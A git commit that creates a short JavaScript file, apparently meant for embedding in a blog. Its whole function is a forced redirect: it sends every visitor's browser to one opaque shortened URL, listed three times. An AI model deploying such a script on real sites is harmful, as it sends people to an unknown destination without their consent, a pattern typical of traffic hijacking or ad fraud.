f4d806d5c959b72f2d052f4dab143a1288343e8e
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-05-28 12:19:53 +0700

    Create blogadsenlangsung.js

---
+++ blogadsenlangsung.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://weaa.me/nfPps',
+
+  'https://weaa.me/nfPps',
+
+  'https://weaa.me/nfPps'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
